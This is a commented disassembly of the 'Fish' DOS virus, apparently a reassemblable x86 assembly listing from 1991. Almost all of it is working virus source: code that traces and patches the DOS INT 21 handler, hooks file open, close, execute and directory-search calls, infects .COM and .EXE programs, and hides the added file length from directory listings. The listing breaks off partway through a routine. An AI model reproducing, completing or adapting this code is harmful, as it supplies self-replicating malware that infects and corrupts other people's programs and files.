
PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ									 ÛÛ
;ÛÛ				FISH_					 ÛÛ
;ÛÛ									 ÛÛ
;ÛÛ	 Created:   1-Jan-80						 ÛÛ
;ÛÛ	 Version:							 ÛÛ
;ÛÛ	 Code type: zero start						 ÛÛ
;ÛÛ	 Passes:    9	       Analysis Options on: A			 ÛÛ
;ÛÛ									 ÛÛ
;ÛÛ	 Disassembled by: Sir John -- 13-Mar-91 			 ÛÛ
;ÛÛ									 ÛÛ
;ÛÛ									 ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

data_1e 	equ	0Ah			; (0000:000A=0)
data_3e 	equ	12h			; (0000:0012=70h)
data_4e 	equ	14h			; (0000:0014=0FF54h)
data_5e 	equ	18h			; (0000:0018=0FF23h)
data_6e 	equ	1Ah			; (0000:001A=0F000h)
data_7e 	equ	475h			; (0000:0475=1)
data_8e 	equ	data_23 - virus_entry + 3	; jmp_len = 3
MCB_0003	equ	3			; Siza of memory block in paragraphs
PSP_0003	equ	3			; Memory size in paragraphs
PSP_000A	equ	0Ah			; (026E:000A=0)
COM_beg 	equ	100h			; .COM file beginning
data_33e	equ	0B3h			; (cs:00B3=5)
all_len 	equ	1000h
encr_len	equ	((locloop_105 - vir_beg) and 0fffeh)+vir_beg - data_311
vir_len 	equ	vir_end - vir_beg
read_len	equ	1Ch

seg_a		segment byte public
		assume	cs:seg_a, ds:seg_a

		org	0

vir_beg:	db	0
		jmp	virus_entry		; (0DCE)
data_23 	dw	20CDh			; original file content
data_24 	dw	0
data_26 	dw	0
		db	8 dup (0)
data_27 	dw	0
data_28 	dw	0
		db	0, 0
data_29 	dd	0
		db	0, 0, 0, 0
exe_flag	db	0


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1		proc	near
		pushf
		call	dword ptr cs:INT_21_ptr ; (cs:0E35=0)
		retn
sub_1		endp

data_311	db	0
		db	'COD'

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_2		proc	near
		pop	cs:tmp_adr		; (cs:0EEA=0)
		pushf
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	ds
		push	es
		jmp	word ptr cs:tmp_adr	; (cs:0EEA=0)
sub_2		endp

sub_3		proc	near
		pop	cs:tmp_adr		; (cs:0EEA=0)
		pop	es
		pop	ds
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		popf
		jmp	word ptr cs:tmp_adr	; (cs:0EEA=0)
sub_3		endp

		db	'SHARK'

sub_4		proc	near
		mov	cs:old_SP,sp		; (cs:0F57=0)
		mov	cs:old_SS,ss		; (cs:0F59=151Ch)
		push	cs
		pop	ss
		mov	sp,cs:virus_SP		; (cs:0F5B=0)
		db	2Eh
		call	sub_3			; Pop flags and registers
		mov	ss,cs:old_SS		; (cs:0F59=151Ch)
		mov	cs:virus_SP,sp		; (cs:0F5B=0)
		mov	sp,cs:old_SP		; (cs:0F57=0)
		retn
sub_4		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_5		proc	near
		mov	cs:old_SP,sp		; (cs:0F57=0)
		mov	cs:old_SS,ss		; (cs:0F59=151Ch)
		push	cs
		pop	ss
		mov	sp,cs:virus_SP		; (cs:0F5B=0)
		db	2Eh
		call	sub_2			; Push flags and registers
		mov	ss,cs:old_SS		; (cs:0F59=151Ch)
		mov	cs:virus_SP,sp		; (cs:0F5B=0)
		mov	sp,cs:old_SP		; (cs:0F57=0)
		retn
sub_5		endp

		db	08Ch

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_6		proc	near
		mov	si,offset data_70	; (cs:0E4B=0)
		les	di,cs:INT_21_ptr	; (cs:0E35=0) Load 32 bit ptr
		push	cs
		pop	ds
		cld				; Clear direction
		mov	cx,5
locloop_1:	lodsb				; String [si] to al
		xchg	al,es:[di]
		mov	[si-1],al
		inc	di
		loop	locloop_1		; Loop if cx > 0
		retn
sub_6		endp

		db	'CARP'

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_7		proc	near
		mov	al,1
		push	cs
		pop	ds
		mov	dx,offset tracer
		call	sub_8			; Set INT 01 vector
		retn
sub_7		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_8		proc	near
		push	es
		push	bx
		xor	bx,bx			; Zero register
		mov	es,bx
		mov	bl,al
		shl	bx,1			; Shift w/zeros fill
		shl	bx,1			; Shift w/zeros fill
		mov	es:[bx],dx
		mov	es:[bx+2],ds
		pop	bx
		pop	es
		retn
sub_8		endp


;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_9		proc	near
		push	ds
		push	si
		xor	si,si			; Zero register
		mov	ds,si
		xor	ah,ah			; Zero register
		mov	si,ax
		shl	si,1			; Shift w/zeros fill
		shl	si,1			; Shift w/zeros fill
		mov	bx,[si]
		mov	es,[si+2]
		pop	si
		pop	ds
		retn
sub_9		endp

		db	'BASS'

virus:		call	sub_13			; (03AD)
		db	0B9h
		call	sub_25			; (0B57)
		db	08Eh
		mov	cs:old_AX,ax		; (cs:0EE3=0)
		mov	ah,52h
		mov	cs:virus_SP,1000h	; (cs:0F5B=0)
		mov	cs:old_DS,ds		; (cs:0E45=26Eh)
		call	sub_29			; (0C97)
		db	0EBh
		int	21h			; DOS Services	ah=function 52h
						;  get DOS data table ptr es:bx
		mov	ax,es:[bx-2]		; Segment of first MCB
		mov	cs:data_69,ax		; (cs:0E47)
		push	cs
		pop	ds
		call	sub_25			; (0B57)
		db	0A1h
		mov	al,21h
		call	sub_9			; Get INT 21 vector
		mov	INT_13_prt+2,es 	; (cs:0E2F) - uses it as temp. ptr
		mov	INT_13_prt,bx		; (cs:0E2D)
		mov	dx,offset tracer
		mov	al,1
		mov	byte ptr data_73,0	; (cs:0E50)
		call	sub_8			; Set INT 01 to tracer
		pushf
		pop	ax
		or	ax,100h 		; Set TF to trace INT 21
		push	ax
		popf
		pushf
		mov	ah,61h
		call	dword ptr INT_13_prt	; (cs:0E2D) - trace INT 21
		pushf
		pop	ax
		and	ax,0FEFFh		; Clear TF
		push	ax
		popf
		call	sub_12			; (033B)
		db	0A3h
		les	di,dword ptr INT_13_prt    ; (cs:0E2D) Load 32 bit ptr
		mov	word ptr INT_21_ptr+2,es   ; (cs:0E37)
		mov	byte ptr data_70,0EAh	; (cs:0E4B) - jmp xxxx:xxxx opcode
		mov	data_71,offset loc_1021 ; (cs:0E4C)
		mov	word ptr INT_21_ptr,di	; (cs:0E35)
		mov	data_72,cs		; (cs:0E4E=7DBCh)
		call	sub_10			; (0180)
		call	sub_6			; Swap JMP xxxx:xxxx
		call	sub_26			; (0B96)
		db	089h

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_10		proc	near
		mov	al,2Fh
		call	sub_9			; Get INT 2F vector
		mov	bx,es
		cmp	cs:data_69,bx		; (cs:0E47=0)
		jae	loc_ret_4		; Jump if above or =
		call	sub_27			; (0BD0)
		mov	ds,cs:INT_13_prt+2	; (cs:0E2F=140Bh)
		push	cs:INT_13_prt		; (cs:0E2D=0)
		pop	dx
		mov	al,13h
		call	sub_8			; Set INT 13 vector
		xor	bx,bx			; Zero register
		mov	ds,bx
		mov	byte ptr ds:data_7e,2	; (0000:0475=1)
loc_ret_4:	retn
sub_10		endp

		db	' FISH VIRUS #6 - EACH DIFF - BON'
		db	'N 2/90 ', 27h, '~knzyvo}', 27h, '$'
loc_4_1:
		call	sub_6			; Swap JMP xxxx:xxxx
		mov	cs:data_72,cs		; (cs:0E4E=7DBCh)
		call	sub_6			; Swap JMP xxxx:xxxx
		push	cs
		pop	ds
		push	ds
		pop	es
		mov	ax,old_DS		; (cs:0E45=26Eh)
		mov	es,ax
		lds	dx,dword ptr es:PSP_000A	; Load 32 bit ptr - terminate addr
		mov	ds,ax
		add	ax,10h
		add	word ptr cs:data_29+2,ax	; (cs:001A=0)
		cmp	cs:exe_flag,0		; (cs:0020=0)
		sti				; Enable interrupts
		jnz	loc_5			; Jump if not zero
		mov	ax,cs:data_23		; (cs:0004=0FBE9h)
		mov	ds:COM_beg,ax		; (026E:0100=0)
		mov	ax,cs:data_24		; (cs:0006=0)
		mov	ds:COM_beg+2,ax 	; (026E:0102=1700h)
		mov	ax,cs:data_26		; (cs:0008=0)
		mov	ds:COM_beg+4,ax 	; (026E:0104=9Ch)
		push	cs:old_DS		; (cs:0E45=26Eh)
		xor	ax,ax			; Zero register
		inc	ah
		push	ax
		mov	ax,cs:old_AX		; (cs:0EE3=0)
		retf				; Jmp cs:100
loc_5:
		add	cs:data_27,ax		; (cs:0012=0)
		mov	ax,cs:old_AX		; (cs:0EE3=0)
		mov	sp,cs:data_28		; (cs:0014=0)
		mov	ss,cs:data_27		; (cs:0012=0)
		jmp	cs:data_29		; (cs:0018=0)

		db	'TROUT'

loc_7:
		xor	sp,sp			; Zero register
		call	sub_11			; (024F)

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_11		proc	near
		mov	bp,ax
		mov	ax,cs
		mov	bx,10h
		mul	bx			; dx:ax = reg * ax
		pop	cx
		sub	cx,24Fh
		add	ax,cx
		adc	dx,0
		div	bx			; ax,dx rem=dx:ax/reg
		push	ax
		mov	ax,offset virus
		push	ax
		mov	ax,bp
		retf				; Return far
sub_11		endp

loc_9:
		call	sub_12			; (033B)
		db	0CDh
		call	sub_29			; (0C97)
		db	0CBh
		push	bx
		mov	bx,sp
		mov	bx,ss:[bx+6]
		mov	cs:data_85,bx		; (cs:0EB3=0)
		pop	bx
		push	bp
		mov	bp,sp
		call	sub_25			; (0B57)
		db	0A3h
		call	sub_5			; Push all in vir's stack
		call	sub_6			; Swap JMP xxxx:xxxx
		call	sub_4			; Pop all from vir's stack
		call	sub_2			; Push flags and registers
		call	sub_25			; (0B57)
		db	088h
		cmp	ah,0Fh
		jne	loc_11			; Jump if not equal
		jmp	loc_32			; (0389)
		db	0B8h
loc_11:
		cmp	ah,11h
		jne	loc_12			; Jump if not equal
		jmp	dos_11_12		   ; (0344)
		db	0A1h
loc_12:
		cmp	ah,12h
		jne	loc_13			; Jump if not equal
		jmp	dos_11_12		   ; (0344)
		db	089h
loc_13:
		cmp	ah,14h
		jne	loc_14			; Jump if not equal
		jmp	dos_14			; (03C4)
		db	0EBh
loc_14:
		cmp	ah,21h
		jne	loc_15			; Jump if not equal
		jmp	dos_21			; (03B8)
		db	08Ch
loc_15:
		cmp	ah,23h
		jne	loc_16			; Jump if not equal
		jmp	dos_23			; (0451)
		db	0A3h
loc_16:
		cmp	ah,27h
		jne	loc_17			; Jump if not equal
		jmp	dos_27			; (03B6)
		db	0EBh
loc_17:
		cmp	ah,3Dh
		jne	loc_18			; Jump if not equal
		jmp	dos_3D			; (04A5)
		db	0FFh
loc_18:
		cmp	ah,3Eh
		jne	loc_19			; Jump if not equal
		jmp	dos_3E			; (04E9)
		db	0A1h
loc_19:
		cmp	ah,3Fh
		jne	loc_20			; Jump if not equal
		jmp	dos_3F			; (0A6E)
		db	088h
loc_20:
		cmp	ah,42h
		jne	loc_21			; Jump if not equal
		jmp	dos_42			; (0A3C)
		db	08Ch
loc_21:
		cmp	ah,4Bh
		jne	loc_22			; Jump if not equal
		jmp	dos_4B			; (051F)
		db	0EBh
loc_22:
		cmp	ah,4Eh
		jne	loc_24			; Jump if not equal
		jmp	dos_4E_4F		   ; (0B5F)
		db	089h
loc_24:
		cmp	ah,4Fh
		jne	loc_25			; Jump if not equal
		jmp	dos_4E_4F		   ; (0B5F)
		db	08Eh
loc_25:
		cmp	ah,57h
		jne	loc_26			; Jump if not equal
		jmp	dos_57			; (09ED)
loc_26:
		jmp	loc_96			; (0C78)
		db	0EBh
loc_27:
		call	sub_29			; (0C97)
		db	0A1h
		call	sub_5			; Push all in vir's stack
		call	sub_6			; Swap JMP xxxx:xxxx
		call	sub_4			; Pop all from vir's stack
		mov	bp,sp
		push	cs:data_85		; (cs:0EB3=0)
		pop	word ptr [bp+6]
		pop	bp
		iret

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_12		proc	near
		inc	cs:_null__		; (cs:0E31=0)
		jmp	loc_91			; (0B57)
sub_12		endp

		db	0A1h
dos_11_12:
		call	sub_3			; Pop flags and registers
		call	sub_1			; Call INT 21
		or	al,al			; Zero ?
		jnz	loc_27			; Jump if not zero
		call	sub_2			; Push flags and registers
		call	sub_14			; (0515)
		mov	al,0
		cmp	byte ptr [bx],0FFh
		jne	loc_30			; Jump if not equal
		mov	al,[bx+6]
		add	bx,7
loc_30:
		and	cs:data_100,al		; (cs:0EF0=0)
		test	byte ptr [bx+1Ah],80h
		jz	dos_0F			; Jump if zero
		sub	byte ptr [bx+1Ah],0C8h
		cmp	byte ptr cs:data_100,0	; (cs:0EF0=0)
		jne	dos_0F			; Jump if not equal
		sub	word ptr [bx+1Dh],0E00h
		sbb	word ptr [bx+1Fh],0
dos_0F:
		call	sub_3			; Pop flags and registers
		jmp	short loc_27		; (0322)

		db	'FIN'

loc_32:
		call	sub_3			; Pop flags and registers
		call	sub_1			; Call INT 21
		call	sub_2			; Push flags and registers
		or	al,al			; Zero ?
		jnz	dos_0F			; Jump if not zero
		mov	bx,dx
		test	byte ptr [bx+15h],80h
		jz	dos_0F			; Jump if zero
		sub	byte ptr [bx+15h],0C8h
		sub	word ptr [bx+10h],0E00h
		sbb	byte ptr [bx+12h],0
		jmp	short dos_0F		; (0381)

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_13		proc	near
		dec	cs:_null__		; (cs:0E31=0)
		jmp	loc_91			; (0B57)
sub_13		endp

		db	0A3h
dos_27:
		jcxz	loc_37			; Jump if cx=0
dos_21:
		mov	bx,dx
		mov	si,[bx+21h]
		or	si,[bx+23h]
		jnz	loc_37			; Jump if not zero
		jmp	short loc_36		; (03CE)
dos_14:
		mov	bx,dx
		mov	ax,[bx+0Ch]
		or	al,[bx+20h]
		jnz	loc_37			; Jump if not zero
loc_36:
		call	sub_18			; Recognize .COM/.EXE file
		jnc	loc_38			; Jump if carry=0
loc_37:
		jmp	loc_26			; (031E)
loc_38:
		call	sub_3			; Pop flags and registers
		call	sub_2			; Push flags and registers
		call	sub_1			; Call INT 21
		mov	[bp-8],cx
		mov	[bp-4],ax
		push	ds
		push	dx
		call	sub_14			; (0515)
		cmp	word ptr [bx+14h],1
		je	loc_39			; Jump if equal
		mov	ax,[bx]
		add	ax,[bx+2]
		push	bx
		mov	bx,[bx+4]
		not	bx
		add	ax,bx
		pop	bx
		jz	loc_39			; Jump if zero
		add	sp,4
		jmp	dos_0F			; (0381)

		db	'MUSKY'

loc_39:
		pop	dx
		pop	ds
		mov	si,dx
		push	cs
		pop	es
		mov	cx,25h
		mov	di,offset data_86	; (cs:0EB5=0)
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	di,offset data_86	; (cs:0EB5=0)
		push	cs
		pop	ds
		mov	dx,[di+12h]
		mov	ax,[di+10h]
		add	ax,0E0Fh
		adc	dx,0
		and	ax,0FFF0h
		mov	[di+12h],dx
		mov	[di+10h],ax
		sub	ax,vir_len + vir_beg - data_28
		sbb	dx,0
		mov	[di+23h],dx
		mov	[di+21h],ax
		mov	cx,1Ch
		mov	word ptr [di+0Eh],1
		mov	ah,27h			; Random block read
		mov	dx,di			; DS:DX -> FCB
		call	sub_1			; Call INT 21
		jmp	dos_0F			; (0381)
dos_23:
		push	cs
		pop	es
		mov	di,offset data_86	; (cs:0EB5=0)
		mov	cx,25h
		mov	si,dx
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		push	ds
		push	dx
		push	cs
		pop	ds
		mov	ah,0Fh			; Open disk file
		mov	dx,offset data_86	; DS:DX -> FCB
		call	sub_1			; Call INT 21
		mov	ah,10h			; Close file
		call	sub_1			; Call INT 21
		test	byte ptr data_89,80h	; (cs:0ECA=0)
		pop	si
		pop	ds
		jz	loc_41
		les	bx,cs:data_88		; (cs:0EC5) Load 32 bit ptr
		mov	ax,es
		sub	bx,vir_len
		sbb	ax,0
		xor	dx,dx
		mov	cx,cs:data_87		; (cs:0EC3)
		dec	cx
		add	bx,cx
		adc	ax,0
		inc	cx
		div	cx			; ax,dx rem=dx:ax/reg
		mov	[si+23h],ax
		xchg	ax,dx
		xchg	ax,bx
		div	cx			; ax,dx rem=dx:ax/reg
		mov	[si+21h],ax
		jmp	dos_0F			; (0381)
loc_41:
		jmp	loc_26			; (031E)
dos_3D:
		call	sub_20			; (0914)
		call	sub_19			; Recognize .COM/.EXE file
		jc	loc_44			; Jump if carry Set
		cmp	byte ptr cs:data_76,0	; (cs:0EA2=0)
		je	loc_44			; Jump if equal
		call	sub_21			; (0921)
		cmp	bx,0FFFFh
		je	loc_44			; Jump if equal
		dec	cs:data_76		; (cs:0EA2=0)
		push	cs
		pop	es
		mov	cx,14h
		mov	di,offset file_name	; (cs:0E52=0)
		xor	ax,ax			; Zero register
		repne	scasw			; Rep zf=0+cx >0 Scan es:[di] for ax
		mov	ax,cs:data_77		; (cs:0EA3=0)
		mov	es:[di-2],ax
		mov	es:[di+26h],bx
		mov	[bp-4],bx
loc_43:
		and	byte ptr cs:data_85,0FEh	; (cs:0EB3=0)
		jmp	dos_0F			; (0381)
loc_44:
		jmp	loc_26			; (031E)
dos_3E:
		push	cs
		pop	es
		call	sub_20			; (0914)
		mov	cx,14h
		mov	ax,cs:data_77		; (cs:0EA3=0)
		mov	di,offset file_name	; (cs:0E52=0)
loc_46:
		repne	scasw			; Rep zf=0+cx >0 Scan es:[di] for ax
		jnz	loc_47			; Jump if not zero
		cmp	bx,es:[di+26h]
		jne	loc_46			; Jump if not equal
		mov	word ptr es:[di-2],0
		call	sub_15			; (0722)
		inc	cs:data_76		; (cs:0EA2=0)
		jmp	short loc_43		; (04DD)
loc_47:
		jmp	loc_26			; (031E)

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_14		proc	near
		mov	ah,2Fh			; Get disk transfer area address
		push	es
		call	sub_1			; Call INT 21
		push	es
		pop	ds
		pop	es
		retn
sub_14		endp

dos_4B:
		or	al,al			; Zero ?
		jz	loc_49			; Jump if zero
		jmp	loc_56			; (067C)
loc_49:
		push	ds
		push	dx
		mov	word ptr cs:data_51+2,es	; (cs:0E26=7DBCh)
		mov	cs:data_51,bx		; (cs:0E24=0)
		lds	si,dword ptr cs:data_51 ; (cs:0E24=0) Load 32 bit ptr
		mov	cx,0Eh
		mov	di,offset data_101	; (cs:0EF1=0)
		push	cs
		pop	es
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		pop	si
		pop	ds
		mov	cx,50h
		mov	di,offset data_109	; (cs:0F07=0)
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	bx,0FFFFh
		call	sub_3			; Pop flags and registers
		pop	bp
		pop	cs:data_95		; (cs:0EE6=0)
		pop	cs:data_96		; (cs:0EE8=0)
		pop	cs:data_85		; (cs:0EB3=0)
		push	cs
		mov	ax,4B01h
		pop	es
		pushf
		mov	bx,offset data_101
		call	dword ptr cs:INT_21_ptr ; (cs:0E35=0)
		jnc	loc_50			; Jump if carry=0
		or	cs:data_85,1		; (cs:0EB3=0)
		push	cs:data_85		; (cs:0EB3=0)
		push	cs:data_96		; (cs:0EE8=0)
		push	cs:data_95		; (cs:0EE6=0)
		push	bp
		les	bx,dword ptr cs:data_51 ; (cs:0E24=0) Load 32 bit ptr
		mov	bp,sp
		jmp	loc_27			; (0322)
loc_50:
		call	sub_20			; (0914)
		push	cs
		pop	es
		mov	cx,14h
		mov	di,offset file_name	; (cs:0E52=0)
loc_51:
		mov	ax,cs:data_77		; (cs:0EA3=0)
		repne	scasw			; Rep zf=0+cx >0 Scan es:[di] for ax
		jnz	loc_52			; Jump if not zero
		mov	word ptr es:[di-2],0
		inc	cs:data_76		; (cs:0EA2=0)
		jmp	short loc_51		; (059C)
loc_52:
		lds	si,cs:data_107		; (cs:0F03=0) Load 32 bit ptr
		cmp	si,1
		jne	loc_53			; Jump if not equal
		mov	dx,ds:data_6e		; (0000:001A=0F000h)
		add	dx,10h
		mov	ah,51h			; Get PSP segment in BX
		call	sub_1			; Call INT 21
		add	dx,bx
		mov	word ptr cs:data_107+2,dx	; (cs:0F05=0)
		push	word ptr ds:data_5e	; (0000:0018=0FF23h)
		pop	word ptr cs:data_107	; (cs:0F03=0)
		add	bx,ds:data_3e		; (0000:0012=70h)
		add	bx,10h
		mov	cs:data_106,bx		; (cs:0F01=0)
		push	word ptr ds:data_4e	; (0000:0014=0FF54h)
		pop	cs:data_105		; (cs:0EFF=0)
		jmp	loc_54			; (0617)
loc_53:
		mov	ax,[si]
		add	ax,[si+2]
		push	bx
		mov	bx,[si+4]
		not	bx
		add	ax,bx
		pop	bx
		jz	loc_55			; Jump if zero
		push	cs
		pop	ds
		mov	dx,0F07h
		call	sub_19			; Recognize .COM/.EXE file
		call	sub_21			; (0921)
		inc	cs:data_99		; (cs:0EEF=0)
		call	sub_15			; (0722)
		dec	cs:data_99		; (cs:0EEF=0)
loc_54:
		mov	ah,51h			; Get PSP segment in BX
		call	sub_1			; Call INT 21
		call	sub_5			; Push all in vir's stack
		call	sub_6			; Swap JMP xxxx:xxxx
		call	sub_4			; Pop all from vir's stack
		mov	ds,bx
		mov	es,bx
		push	cs:data_85		; (cs:0EB3=0)
		push	cs:data_96		; (cs:0EE8=0)
		push	cs:data_95		; (cs:0EE6=0)
		pop	word ptr ds:PSP_000A	; (0000:000A=0F000h)
		pop	word ptr ds:PSP_000A+2	; (0000:000C=7F6h)
		push	ds
		mov	al,22h
		lds	dx,dword ptr ds:PSP_000A ; (0000:000A=0F000h) Load 32 bit ptr
		call	sub_8			 ; Set INT 22 vector
		pop	ds
		popf
		pop	ax
		mov	sp,cs:data_105		; (cs:0EFF=0)
		mov	ss,cs:data_106		; (cs:0F01=0)
		jmp	dword ptr cs:data_107	; (cs:0F03=0)

		db	'SOLE'

loc_55: 	mov	bx,[si+1]
		mov	ax,ds:[data_8e][bx+si]	 ; (0000:F239=7404h)
		mov	[si],ax
		mov	ax,ds:[data_8e+2][bx+si] ; (0000:F23B=7504h)
		mov	[si+2],ax
		mov	ax,ds:[data_8e+4][bx+si] ; (0000:F23D=0FF04h)
		mov	[si+4],ax
		call	sub_24			; (0A51)
		jmp	short loc_54		; (0617)
loc_56:
		cmp	al,1
		je	loc_57			; Jump if equal
		jmp	loc_26			; (031E)
loc_57:
		or	cs:data_85,1		; (cs:0EB3=0)
		mov	word ptr cs:data_51+2,es	; (cs:0E26=7DBCh)
		mov	cs:data_51,bx		; (cs:0E24=0)
		call	sub_3			; Pop flags and registers
		call	sub_1			; Call INT 21
		call	sub_2			; Push flags and registers
		les	bx,dword ptr cs:data_51 ; (cs:0E24=0) Load 32 bit ptr
		lds	si,dword ptr es:[bx+12h]	; Load 32 bit ptr
		jc	loc_60			; Jump if carry Set
		and	byte ptr cs:data_85,0FEh	; (cs:0EB3=0)
		cmp	si,1
		je	loc_58			; Jump if equal
		mov	ax,[si]
		add	ax,[si+2]
		push	bx
		mov	bx,[si+4]
		not	bx
		add	ax,bx
		pop	bx
		jnz	loc_59			; Jump if not zero
		mov	bx,[si+1]
		mov	ax,word ptr ds:[0F239h][bx+si]	; (cs:F239=0)
		mov	[si],ax
		mov	ax,word ptr ds:[0F23Bh][bx+si]	; (cs:F23B=0)
		mov	[si+2],ax
		mov	ax,word ptr ds:[0F23Dh][bx+si]	; (cs:F23D=0)
		mov	[si+4],ax
		jmp	short loc_59		; (0707)
loc_58:
		mov	dx,word ptr data_29+2	; (cs:001A=0)
		call	sub_20			; (0914)
		mov	cx,cs:data_77		; (cs:0EA3=0)
		add	cx,10h
		add	dx,cx
		mov	es:[bx+14h],dx
		mov	ax,word ptr data_29	; (cs:0018=0)
		mov	es:[bx+12h],ax
		mov	ax,data_27		; (cs:0012=0)
		add	ax,cx
		mov	es:[bx+10h],ax
		mov	ax,data_28		; (cs:0014=0)
		mov	es:[bx+0Eh],ax
loc_59:
		call	sub_20			; (0914)
		mov	ds,cs:data_77		; (cs:0EA3=0)
		mov	ax,[bp+2]
		mov	ds:data_1e,ax		; (0000:000A=0F000h)
